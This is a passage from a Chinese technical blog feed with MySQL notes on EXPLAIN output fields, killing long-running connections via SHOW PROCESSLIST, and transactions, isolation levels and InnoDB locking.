  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name</span><br><span class="line">    <span class="keyword">WHERE</span> key_column <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name</span><br><span class="line">    <span class="keyword">WHERE</span> key_column <span class="keyword">BETWEEN</span> <span class="number">10</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name</span><br><span class="line">    <span class="keyword">WHERE</span> key_column <span class="keyword">IN</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name</span><br><span class="line">    <span class="keyword">WHERE</span> key_part1 <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> key_part2 <span class="keyword">IN</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>index</p>
<p>  该类型等同于下面的<code>ALL</code>类型，只是索引树被扫描。在两种情形下会发生:</p>
<ul>
<li>如果索引是查询的覆盖索引并且可以用于查询到表中所有需要的数据，索引树就会被扫描。这种情况下，<code>Extra</code>字段的值将是<code>Using index</code>。索引扫描会比全表扫描快因为索引要比实际数据小。</li>
<li>利用索引做全表扫描用以索引的排序查询数据。这种情况下<code>Extra</code>字段的值不是<code>Using index</code>。</li>
</ul>
</li>
<li><p>ALL</p>
<p>  全表扫描用于先前表返回每行数据的联合查询。如果该表是第一个未被标记为<code>const</code>类型的表，那这种情况通常是低效的，并且在其它任何情形下也是不好的。一般可以通过增加索引来检索基于常量或先前的表返回的数据用以避免全表扫描这种类型。</p>
</li>
</ul>
<h3 id="Extra-附件信息"><a href="#Extra-附件信息" class="headerlink" title="Extra(附件信息)"></a>Extra(附件信息)</h3><p>该字段输出一些关于MySQL实际如何执行语句的额外信息，下文会介绍该字段可能出现的值以及相应的JSON格式的输出。</p>
<p>如果你希望SQL语句执行的更快，可以去探究输出了<code>Using filesort</code>或<code>Using temporary</code>值的该字段，对应于JSON格式则using_filesort和using_temporary_table属性的值都为true。</p>
<ul>
<li><p>Child of ‘table’ pushed join@1 (JSON: message text)</p>
</li>
<li><p>const row not found (JSON property: const_row_not_found)</p>
</li>
<li><p>Deleting all rows (JSON property: message)</p>
</li>
<li><p>Distinct (JSON property: distinct)</p>
</li>
<li><p>FirstMatch(tbl_name) (JSON property: first_match)</p>
</li>
<li><p>Full scan on NULL key (JSON property: message)</p>
</li>
<li><p>Impossible HAVING (JSON property: message)</p>
</li>
<li><p>Impossible WHERE (JSON property: message)</p>
</li>
<li><p>Impossible WHERE noticed after reading const tables (JSON property: message)</p>
</li>
<li><p>LooseScan(m..n) (JSON property: message)</p>
</li>
<li><p>No matching min/max row (JSON property: message)</p>
</li>
<li><p>no matching row in const table (JSON property: message)</p>
</li>
<li><p>No matching rows after partition pruning (JSON property: message)</p>
</li>
<li><p>No tables used (JSON property: message)</p>
</li>
<li><p>Not exists (JSON property: message)</p>
</li>
<li><p>Plan isn’t ready yet (JSON property: none)</p>
</li>
<li><p>Range checked for each record (index map: N) (JSON property: message)</p>
</li>
<li><p>Scanned N databases (JSON property: message)</p>
</li>
<li><p>Select tables optimized away (JSON property: message)</p>
</li>
<li><p>Skip_open_table, Open_frm_only, Open_full_table (JSON property: message)</p>
</li>
<li><p>Start temporary, End temporary (JSON property: message)</p>
</li>
<li><p>unique row not found (JSON property: message)</p>
</li>
<li><p>Using filesort (JSON property: using_filesort)</p>
<p>  为了确定如何按照一定的排序检索数据，MySQL必须做一个额外的转换。排序通过遍历所有行和存储所有匹配WHERE子句条件的行的键和指针完成。这些键是有序的，然后所有数据也会按照一定的顺序来检索。</p>
</li>
<li><p>Using index (JSON property: using_index)</p>
<p>  仅使用索引树来检索表中的数据，而不需要进行额外的对实际数据的搜索。当查询只使用作为单个索引一部分的列时会使用此策略。</p>
<p>  对于含有用户自定义聚簇索引的Innodb表，即使该字段不是<code>Using index</code>值也可能使用索引，这种情形出现在<code>type</code>字段的值是index并且<code>key</code>字段的值是PRIMARY时。</p>
</li>
<li><p>Using index condition (JSON property: using_index_condition)</p>
</li>
<li><p>Using index for group-by (JSON property: using_index_for_group_by)</p>
</li>
<li><p>Using join buffer (Block Nested Loop), Using join buffer (Batched Key Access) (JSON property: using_join_buffer)</p>
</li>
<li><p>Using MRR (JSON property: message)</p>
</li>
<li><p>Using sort_union(…), Using union(…), Using intersect(…) (JSON property: message)</p>
</li>
<li><p>Using temporary (JSON property: using_temporary_table)</p>
</li>
<li><p>Using where (JSON property: attached_condition)</p>
</li>
<li><p>Using where with pushed condition (JSON property: message)</p>
</li>
<li><p>Zero limit (JSON property: message)</p>
</li>
</ul>
<h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL连接数过多的处理</title>
    <url>/2016/12/18/mysql-too-many-connections/</url>
    <content><![CDATA[<p>场景：MySQL出现“too many connections”错误  </p>
<p>MySQL默认会额外保留一条供root用户建立的连接，以确保root用户可随时登录查看并检测服务器状态，当出现上述场景时，我们就可通过<code>show [full] processlist</code>命令查看当前所有进程状态，通过kill掉某些慢sql及分析产生原因来优化sql代码. 操作如下.</p>
<h3 id="查看mysql所有执行状态"><a href="#查看mysql所有执行状态" class="headerlink" title="查看mysql所有执行状态"></a>查看mysql所有执行状态</h3><p><code>mysql&gt; show full processlist</code>  </p>
<p>如果MySQL登录用户有<a href="http://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_process">PROCESS权限</a>，列表会输出所有进程信息，否则只有当前登录用户所属的进程，若不加full关键字，Info字段信息会只截取前100个字符显示.  </p>
<p>列表字段说明：</p>
<h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>MySQL连接的id标示</p>
<h4 id="User"><a href="#User" class="headerlink" title="User"></a>User</h4><p>建立此次连接的MySQL user</p>
<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>此次连接建立的客户端，如果是系统进程此处则为空。MySQL通过此次TCP/IP连接中的<code>host_name:client_port</code>信息获取host name</p>
<h4 id="db"><a href="#db" class="headerlink" title="db"></a>db</h4><p>操作的数据库，可能为null</p>
<h4 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h4><p>当前sql语句的类型，一般为休眠（sleep），查询（query），连接（connect）</p>
<h4 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h4><p>当前进程在当前状态停留的时间，单位秒</p>
<h4 id="State"><a href="#State" class="headerlink" title="State"></a>State</h4><p>当前进程的<a href="http://dev.mysql.com/doc/refman/5.7/en/general-thread-states.html">执行状态</a>，大部分的状态切换很快，<strong>如果发现某个进程在某个状态阻塞很久说明sql执行可能有问题</strong></p>
<h4 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h4><p>进程详情信息，如select查询进程此处会是select语句</p>
<span id="more"></span>
<h3 id="杀掉某个进程"><a href="#杀掉某个进程" class="headerlink" title="杀掉某个进程"></a>杀掉某个进程</h3><p><code>mysql&gt; kill &#123;id&#125;</code>  </p>
<p>通过上面的state/Command/Time字段可大致判断出有问题的sql语句，可通过kill命令杀掉该进程，MySQL命令只能一个个kill进程，批量kill需结合循环进行，示例如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># kill掉阻塞到当前状态已超过200秒的进程</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="string">&quot;SHOW FULL PROCESSLIST&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">      <span class="variable">$process_id</span> = <span class="variable">$row</span>[<span class="string">&quot;Id&quot;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&quot;Time&quot;</span>] &gt; <span class="number">200</span> ) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;KILL <span class="subst">$process_id</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库事务与并发控制</title>
    <url>/2017/06/21/mysql-transaction-and-lock/</url>
    <content><![CDATA[<h3 id="数据库事务"><a href="#数据库事务" class="headerlink" title="数据库事务"></a>数据库事务</h3><blockquote>
<p>数据库管理系统执行过程中的一个逻辑单位，由一个有限的数据库操作序列构成.</p>
</blockquote>
<p>一个数据库事务通常包含了一个序列的对数据库的读/写操作。它的存在包含有以下两个目的：</p>
<ul>
<li>为数据库操作序列提供了一个从失败中恢复到正常状态的方法，同时提供了数据库即使在异常状态下仍能保持一致性的方法。</li>
<li>当多个应用程序在并发访问数据库时，可以在这些应用程序之间提供一个隔离方法，以防止彼此的操作互相干扰。</li>
</ul>
<p>当事务被提交给了DBMS（数据库管理系统），则DBMS（数据库管理系统）需要确保该事务中的所有操作都成功完成且其结果被永久保存在数据库中，如果事务中有的操作没有成功完成，则事务中的所有操作都需要被回滚，回到事务执行前的状态;同时，该事务对数据库或者其他事务的执行无影响，所有的事务都好像在独立的运行。</p>
<p>但在现实情况下，失败的风险很高。在一个数据库事务的执行过程中，有可能会遇上事务操作失败、数据库系统/操作系统失败，甚至是存储介质失败等情况。这便需要DBMS对一个执行失败的事务执行恢复操作，将其数据库状态恢复到一致状态（数据的一致性得到保证的状态）。为了实现将数据库状态恢复到一致状态的功能，DBMS通常需要维护**事务日志(基于日志的REDO/UNDO机制)**以追踪事务中所有影响数据库数据的操作。</p>
<h4 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h4><ul>
<li>原子性（Atomicity）：事务作为一个整体被执行，包含在其中的对数据库的操作要么全部被执行，要么都不执行。</li>
<li>一致性（Consistency）：事务应确保数据库的状态从一个一致状态转变为另一个一致状态。一致状态的含义是数据库中的数据应满足完整性约束。</li>
<li>隔离性（Isolation）：多个事务并发执行时，一个事务的执行不应影响其他事务的执行。</li>
<li>持久性（Durability）：已被提交的事务对数据库的修改应该永久保存在数据库中。<span id="more"></span>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4>用一个常用的“A账户向B账号汇钱”的例子来说明如何通过数据库事务保证数据的准确性和完整性。熟悉关系型数据库事务的都知道从帐号A到帐号B需要6个操作：</li>
</ul>
<ol>
<li>从A账号中把余额读出来（500）。</li>
<li>对A账号做减法操作（500-100）。</li>
<li>把结果写回A账号中（400）。</li>
<li>从B账号中把余额读出来（500）。</li>
<li>对B账号做加法操作（500+100）。</li>
<li>把结果写回B账号中（600）。</li>
</ol>
<h5 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h5><p>保证1-6所有过程要么都执行，要么都不执行。一旦在执行某一步骤的过程中发生问题，就需要执行回滚操作。 假如执行到第五步的时候，B账户突然不可用（比如被注销），那么之前的所有操作都应该回滚到执行事务之前的状态。</p>
<h5 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h5><p>在转账之前，A和B的账户中共有500+500=1000元钱。在转账之后，A和B的账户中共有400+600=1000元。也就是说，数据的状态在执行该事务操作之后从一个状态改变到了另外一个状态。同时一致性还能保证账户余额不会变成负数等。</p>
<h5 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h5><p>在A向B转账的整个过程中，只要事务还没有提交（commit），查询A账户和B账户的时候，两个账户里面的钱的数量都不会有变化。<br>如果在A给B转账的同时，有另外一个事务执行了C给B转账的操作，那么当两个事务都结束的时候，B账户里面的钱应该是A转给B的钱加上C转给B的钱再加上自己原有的钱。</p>
<h5 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h5><p>一旦转账成功（事务提交），两个账户的里面的钱就会真的发生变化（会把数据写入数据库做持久化保存）</p>
<h3 id="读现象"><a href="#读现象" class="headerlink" title="读现象"></a>读现象</h3><blockquote>
<p>ANSI/ISO SQL 92标准涉及三种不同的一个事务读取另外一个事务可能修改的数据的“读现象”。</p>
</blockquote>
<h4 id="脏读"><a href="#脏读" class="headerlink" title="脏读"></a>脏读</h4><p>当一个事务允许读取另外一个事务修改但未提交的数据时，就可能发生脏读。</p>
<h4 id="不可重复读"><a href="#不可重复读" class="headerlink" title="不可重复读"></a>不可重复读</h4><p>在一次事务中，当一行数据获取两遍得到不同的结果表示发生了“不可重复读”。</p>
<h4 id="幻影读"><a href="#幻影读" class="headerlink" title="幻影读"></a>幻影读</h4><p>在事务执行过程中，当两个完全相同的查询语句执行得到不同的结果集。</p>
<h3 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h3><p>在数据库事务的ACID四个属性中，隔离性是一个最常放松的一个。为了获取更高的隔离等级，数据库系统的锁机制或者多版本并发控制机制都会影响并发。 应用软件也需要额外的逻辑来使其正常工作。</p>
<h4 id="可序列化"><a href="#可序列化" class="headerlink" title="可序列化"></a>可序列化</h4><p>最高的隔离级别。<br>在基于锁机制并发控制的DBMS实现可序列化，要求在选定对象上的读锁和写锁保持直到事务结束后才能释放。在SELECT 的查询中使用一个“WHERE”子句来描述一个范围时应该获得一个“范围锁”（range-locks）。这种机制可以避免“幻影读”（phantom reads）现象（详见下文）。<br>当采用不基于锁的并发控制时不用获取锁。但当系统探测到几个并发事务有“写冲突”的时候，只有其中一个是允许提交的。这种机制的详细描述见“快照隔离”</p>
<h4 id="可重复读"><a href="#可重复读" class="headerlink" title="可重复读"></a>可重复读</h4><p>在可重复读（REPEATABLE READS）隔离级别中，基于锁机制并发控制的DBMS需要对选定对象的读锁（read locks）和写锁（write locks）一直保持到事务结束，但不要求“范围锁”，因此可能会发生“幻影读”。</p>
<h4 id="提交读"><a href="#提交读" class="headerlink" title="提交读"></a>提交读</h4><p>在提交读（READ COMMITTED）级别中，基于锁机制并发控制的DBMS需要对选定对象的写锁一直保持到事务结束，但是读锁在SELECT操作完成后马上释放（因此“不可重复读”现象可能会发生，见下面描述）。和前一种隔离级别一样，也不要求“范围锁”。</p>
<h4 id="未提交读"><a href="#未提交读" class="headerlink" title="未提交读"></a>未提交读</h4><p>未提交读（READ UNCOMMITTED）是最低的隔离级别。允许“脏读”（dirty reads），事务可以看到其他事务“尚未提交”的修改。<br>通过比低一级的隔离级别要求更多的限制，高一级的级别提供更强的隔离性。标准允许事务运行在更强的事务隔离级别上。(如在可重复读隔离级别上执行提交读的事务是没有问题的)</p>
<h3 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h3><p>并发控制描述了数据库事务隔离以保证数据正确性的机制。为了保证并行事务执行的准确执行，数据库和存储引擎在设计的时候着重强调了并发控制这一点。典型的事务相关机制限制数据的访问顺序（执行调度）以满足可序列化 和可恢复性。限制数据访问意味着降低了执行的性能，并发控制机制就是要保证在满足这些限制的前提下提供尽可能高的性能。经常在不损害正确性的情况下，为了达到更好的性能，可序列化的要求会减低一些，但是为了避免数据一致性的破坏，可恢复性必须保证。</p>
<p>两阶段锁是关系数据库中最常见的提供了可序列化和可恢复性的并发控制机制，为了访问一个数据库对象，事务首先要获得这个对象的锁。对于不同的访问类型（如对对象的读写操作）和锁的类型，如果另外一个事务正持有这个对象的锁，获得锁的过程会被阻塞或者延迟。</p>
<h3 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h3><p>封锁是一项用于多用户同时访问数据库的技术，是实现并发控制的一项重要手段，能够防止当多用户改写数据库时造成数据丢失和损坏。当有一个用户对数据库内的数据进行操作时，在读取数据前先锁住数据，这样其他用户就无法访问和修改该数据，直到这一数据修改并写回数据库解除封锁为止。</p>
<p>封锁也有不同的分类与概念:</p>
<h4 id="使用方式区分"><a href="#使用方式区分" class="headerlink" title="使用方式区分"></a>使用方式区分</h4><h5 id="乐观并发控制-乐观锁"><a href="#乐观并发控制-乐观锁" class="headerlink" title="乐观并发控制(乐观锁)"></a>乐观并发控制(乐观锁)</h5><blockquote>
<p>在关系数据库管理系统里，乐观并发控制（又名“乐观锁”，Optimistic Concurrency Control，缩写“OCC”）是一种并发控制的方法。它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p>
</blockquote>
<p>** 乐观并发控制多数用于数据争用不大、冲突较少的环境中，这种环境中，偶尔回滚事务的成本会低于读取数据时锁定数据的成本，因此可以获得比其他并发控制方法更高的吞吐量。 **</p>
<p>相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录<strong>数据版本</strong>。</p>
<p>数据版本</p>
<blockquote>
<p>为数据增加的一个版本标识。当读取数据时，将版本标识的值一同读出，数据每更新一次，同时对版本标识进行更新。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的版本标识进行比对，如果数据库表当前版本号与第一次取出来的版本标识值相等，则予以更新，否则认为是过期数据。</p>
</blockquote>
<p>实现数据版本有两种方式，第一种是使用<strong>版本号</strong>，第二种是使用<strong>时间戳</strong>。</p>
<h6 id="版本号实现乐观锁"><a href="#版本号实现乐观锁" class="headerlink" title="版本号实现乐观锁"></a>版本号实现乐观锁</h6><p>使用版本号时，可以在数据初始化时指定一个版本号，每次对数据的更新操作都对版本号执行+1操作。并判断当前版本号是不是该数据的最新的版本号。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="number">1.</span>查询出商品信息</span><br><span class="line"><span class="keyword">select</span> (status,status,version) <span class="keyword">from</span> t_goods <span class="keyword">where</span> id<span class="operator">=</span>#&#123;id&#125;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="number">2.</span>根据商品信息生成订单</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="number">3.</span>修改商品status为<span class="number">2</span></span><br><span class="line"><span class="keyword">update</span> t_goods <span class="keyword">set</span> status<span class="operator">=</span><span class="number">2</span>, version<span class="operator">=</span>version<span class="operator">+</span><span class="number">1</span> <span class="keyword">where</span> id<span class="operator">=</span>#&#123;id&#125; <span class="keyword">and</span> version<span class="operator">=</span>#&#123;version&#125;;</span><br></pre></td></tr></table></figure>

<h6 id="时间戳实现乐观锁"><a href="#时间戳实现乐观锁" class="headerlink" title="时间戳实现乐观锁"></a>时间戳实现乐观锁</h6><p>同版本号类似，增加一列updated_at字段标识该行数据修改的时间，修改前读出时间戳，更新时update 时间戳并在where中判断时间戳是否为开始取出的值。</p>
<h6 id="优点与不足"><a href="#优点与不足" class="headerlink" title="优点与不足"></a>优点与不足</h6><p>乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。但如果直接简单这么做，还是有可能会遇到不可预期的结果，例如<strong>两个事务都读取了数据库的某一行，经过修改以后写回数据库，这时就遇到了问题</strong>(这种酌情可用悲观锁处理解决)。</p>
<h5 id="悲观并发控制-悲观锁"><a href="#悲观并发控制-悲观锁" class="headerlink" title="悲观并发控制(悲观锁)"></a>悲观并发控制(悲观锁)</h5><blockquote>
<p>在关系数据库管理系统里，悲观并发控制（又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”）是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作读某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。</p>
</blockquote>
<p>悲观并发控制主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护数据的成本要低于回滚事务的成本的环境中。</p>
<h6 id="悲观锁加锁流程"><a href="#悲观锁加锁流程" class="headerlink" title="悲观锁加锁流程"></a>悲观锁加锁流程</h6><ol>
<li>在对任意记录进行修改前，先尝试为该记录加上排他锁（exclusive locking）。</li>
<li>如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。 具体响应方式由开发者根据实际需要决定。</li>
<li>如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁了。</li>
<li>其间如果有其他对该记录做修改或加排他锁的操作，都会等待我们解锁或直接抛出异常。</li>
</ol>
<h6 id="Innodb悲观锁"><a href="#Innodb悲观锁" class="headerlink" title="Innodb悲观锁"></a>Innodb悲观锁</h6><blockquote>
<p>要使用悲观锁，我们必须关闭mysql数据库的自动提交属性，因为MySQL默认使用autocommit模式，也就是说，当你执行一个更新操作后，MySQL会立刻将结果进行提交。set autocommit=0;</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">0.</span>开始事务(三者选一就可以)</span><br><span class="line"><span class="keyword">begin</span>;<span class="operator">/</span><span class="keyword">begin</span> work;<span class="operator">/</span><span class="keyword">start</span> transaction; </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">1.</span>查询出商品信息</span><br><span class="line"><span class="keyword">select</span> status <span class="keyword">from</span> t_goods <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">2.</span>根据商品信息生成订单</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_orders (id,goods_id) <span class="keyword">values</span> (<span class="keyword">null</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">3.</span>修改商品status为<span class="number">2</span></span><br><span class="line"><span class="keyword">update</span> t_goods <span class="keyword">set</span> status<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">4.</span>提交事务</span><br><span class="line"><span class="keyword">commit</span>;<span class="operator">/</span><span class="keyword">commit</span> work;</span><br></pre></td></tr></table></figure>

<p>上面的查询语句中，我们使用了<strong>select…for update</strong>的方式，这样就通过开启排他锁的方式实现了悲观锁。此时在t_goods表中，id为1的 那条数据就被我们锁定了，其它的事务必须等本次事务提交之后才能执行。这样我们可以保证当前的数据不会被其它事务修改。</p>
<blockquote>
<p>上面我们提到，使用select…for update会把数据给锁住，不过我们需要注意一些锁的级别，MySQL InnoDB默认行级锁。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意。</p>
</blockquote>
<h6 id="优点与不足-1"><a href="#优点与不足-1" class="headerlink" title="优点与不足"></a>优点与不足</h6><p>悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会；另外，在只读型事务处理中由于不会产生冲突，也没必要使用锁，这样做只能增加系统负载；还有会降低了并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数</p>
<h4 id="级别区分"><a href="#级别区分" class="headerlink" title="级别区分"></a>级别区分</h4><h5 id="共享锁-读锁"><a href="#共享锁-读锁" class="headerlink" title="共享锁(读锁)"></a>共享锁(读锁)</h5><p>共享锁又称读锁，是读取操作创建的锁。其他用户可以并发读取数据，但任何事务都不能对数据进行修改（获取数据上的排他锁），直到已释放所有共享锁。</p>
<p>如果事务T对数据A加上共享锁后，则其他事务只能对A再加共享锁，不能加排他锁。获准共享锁的事务只能读数据，不能修改数据。</p>
<h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><pre><code>SELECT ... LOCK IN SHARE MODE;
</code></pre>
<p>在查询语句后面增加LOCK IN SHARE MODE，Mysql会对查询结果中的每行都加共享锁，当没有其他线程对查询结果集中的任何一行使用排他锁时，可以成功申请共享锁，否则会被阻塞。其他线程也可以读取使用了共享锁的表，而且这些线程读取的是同一个版本的数据。</p>
<h5 id="排它锁-写锁"><a href="#排它锁-写锁" class="headerlink" title="排它锁(写锁)"></a>排它锁(写锁)</h5><p>排他锁又称写锁，如果事务T对数据A加上排他锁后，则其他事务不能再对A加任任何类型的封锁。获准排他锁的事务既能读数据，又能修改数据。</p>
<h6 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h6><pre><code>SELECT ... FOR UPDATE;
</code></pre>
<p>在查询语句后面增加FOR UPDATE，Mysql会对查询结果中的每行都加排他锁，当没有其他线程对查询结果集中的任何一行使用排他锁时，可以成功申请排他锁，否则会被阻塞。</p>
<h5 id="意向锁-InnodB自动加的锁"><a href="#意向锁-InnodB自动加的锁" class="headerlink" title="意向锁(InnodB自动加的锁)"></a>意向锁(InnodB自动加的锁)</h5><p>意向锁是表级锁，其设计目的主要是为了在一个事务中揭示下一行将要被请求锁的类型。</p>
<h6 id="意向共享锁（IS）"><a href="#意向共享锁（IS）" class="headerlink" title="意向共享锁（IS）"></a>意向共享锁（IS）</h6><p>事务准备给数据行加入共享锁，也就是说一个数据行加共享锁前必须先取得该表的IS锁</p>
<h6 id="意向排他锁（IX）"><a href="#意向排他锁（IX）" class="headerlink" title="意向排他锁（IX）"></a>意向排他锁（IX）</h6><p>类似上面，表示事务准备给数据行加入排他锁，说明事务在一个数据行加排他锁前必须先取得该表的IX锁</p>
<p>对于insert、update、delete，InnoDB会自动给涉及的数据加排他锁（X）；对于一般的Select语句，InnoDB不会加任何锁，事务可以通过以下语句给显示加共享锁或排他锁。</p>
<h4 id="粒度区分"><a href="#粒度区分" class="headerlink" title="粒度区分"></a>粒度区分</h4><h5 id="表级锁"><a href="#表级锁" class="headerlink" title="表级锁"></a>表级锁</h5><p>表级锁是MySQL中锁定粒度最大的一种锁，表示对当前操作的整张表加锁，它实现简单，资源消耗较少，被大部分MySQL引擎支持。最常使用的MYISAM与INNODB都支持表级锁定。</p>
<h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><p>开销小，加锁快；不会出现死锁；锁定粒度大，发出锁冲突的概率最高，并发度最低。</p>
<h5 id="行级锁"><a href="#行级锁" class="headerlink" title="行级锁"></a>行级锁</h5><p>行级锁是Mysql中锁定粒度最细的一种锁，表示只针对当前操作的行进行加锁。行级锁能大大减少数据库操作的冲突。其加锁粒度最小，但加锁的开销也最大。行级锁分为共享锁 和 排他锁。</p>
<h6 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h6><p>开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。</p>
<h5 id="页级锁"><a href="#页级锁" class="headerlink" title="页级锁"></a>页级锁</h5><p>页级锁是MySQL中锁定粒度介于行级锁和表级锁中间的一种锁。表级锁速度快，但冲突多，行级冲突少，但速度慢。所以取了折衷的页级，一次锁定相邻的一组记录。BDB支持页级锁</p>
<h6 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h6><p>开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</p>
<h5 id="MySQL常用存储引擎的锁机制"><a href="#MySQL常用存储引擎的锁机制" class="headerlink" title="MySQL常用存储引擎的锁机制"></a>MySQL常用存储引擎的锁机制</h5><blockquote>
<p>MyISAM和MEMORY采用表级锁(table-level locking)</p>
</blockquote>
<blockquote>
<p>BDB采用页面锁(page-level locking)或表级锁，默认为页面锁</p>
</blockquote>
<blockquote>
<p>InnoDB支持行级锁(row-level locking)和表级锁,默认为行级锁</p>
</blockquote>
<h6 id="Innodb"><a href="#Innodb" class="headerlink" title="Innodb"></a>Innodb</h6><p>InnoDB行锁是通过给索引上的索引项加锁来实现的，这一点MySQL与Oracle不同，后者是通过在数据块中对相应数据行加锁来实现的。InnoDB这种行锁实现特点意味着：<strong>只有通过索引条件检索数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁！</strong></p>
<p>在实际应用中，要特别注意InnoDB行锁的这一特性，不然的话，可能导致大量的锁冲突，从而影响并发性能。</p>
<ul>
<li>在不通过索引条件查询的时候,InnoDB 确实使用的是表锁,而不是行锁。</li>
<li>由于 MySQL 的行锁是针对索引加的锁,不是针对记录加的锁,所以虽然是访问不同行 的记录,但是如果是使用相同的索引键,是会出现锁冲突的。应用设计的时候要注意这一点。</li>
<li>当表有多个索引的时候,不同的事务可以使用不同的索引锁定不同的行,另外,不论是使用主键索引、唯一索引或普通索引,InnoDB 都会使用行锁来对数据加锁。</li>
<li>即便在条件中使用了索引字段,但是否使用索引来检索数据是由 MySQL 通过判断不同 执行计划的代价来决定的,如果MySQL认为全表扫效率更高,比如对一些很小的表,它就不会使用索引,这种情况下InnoDB 将使用表锁,而不是行锁。因此,在分析锁冲突时,别忘了检查SQL的执行计划,以确认是否真正使用了索引。</li>
</ul>
<h6 id="行级锁与死锁"><a href="#行级锁与死锁" class="headerlink" title="行级锁与死锁"></a>行级锁与死锁</h6><p>MyISAM中是不会产生死锁的，因为MyISAM总是一次性获得所需的全部锁，要么全部满足，要么全部等待。而在InnoDB中，锁是逐步获得的，就造成了死锁的可能。</p>
